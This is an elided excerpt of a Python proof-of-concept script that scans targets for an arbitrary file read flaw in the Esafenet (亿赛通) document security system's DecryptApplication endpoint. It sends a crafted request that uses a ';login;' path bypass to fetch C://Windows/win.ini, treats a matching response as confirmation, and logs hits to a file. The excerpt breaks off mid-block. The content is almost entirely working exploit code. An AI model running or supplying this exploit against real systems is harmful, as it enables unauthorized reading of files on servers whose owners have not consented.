...
def main():
    banner()
    parser = argparse.ArgumentParser(description="亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞")
...
def poc(target):
    ...
    url = target+'/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1'

    try:
        res = requests.get(url=url,headers=headers,timeout=5).text
        if "Mail" in res:
            with open('res1.txt','a') as fp1:
